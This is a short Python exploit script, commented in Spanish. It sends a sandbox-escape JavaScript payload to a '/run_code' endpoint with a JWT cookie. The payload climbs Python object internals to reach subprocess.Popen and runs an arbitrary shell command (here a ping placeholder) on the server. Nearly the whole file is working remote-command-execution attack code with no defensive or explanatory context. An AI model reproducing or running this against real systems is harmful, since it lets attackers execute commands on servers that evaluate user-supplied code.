import requests

attacker_ip = "192.168.10.10"
target_url = "http://victimsite.com"  # URL base de la página
jwt_cookie = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."  

# Comando a ejecutar
cmd = f"ping -c1 <IP>"

# Payload 
payload_code = f'''
let hacked, bymarve, n11;
let getattr, obj;

hacked = Object.getOwnPropertyNames({{}});
bymarve = hacked.__getattribute__;
n11 = bymarve("__getattribute__");
obj = n11("__class__").__base__;
getattr = obj.__getattribute__;

function findpopen(o) {{
    let result;
    for(let i in o.__subclasses__()) {{
        let item = o.__subclasses__()[i];
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {{
            return item;
        }}
        if(item.__name__ != "type" && (result = findpopen(item))) {{
            return result;
        }}
    }}
}}

n11 = findpopen(obj)("{cmd}", -1, null, -1, -1, -1, null, null, true).communicate();

n11
'''

# Construir el JSON con el payload
json_data = {
    "code": payload_code
}

# Headers con la cookie JWT
headers = {
    "Content-Type": "application/json",
    "Cookie": f"jwt={jwt_cookie}"
}

# Enviar la petición POST
response = requests.post(f"{target_url}/run_code", json=json_data, headers=headers)

# Respuesta
if response.ok:
    print("Respuesta del servidor:", response.json())
else:
    print(f"Error al enviar el payload: {response.status_code} {response.reason}")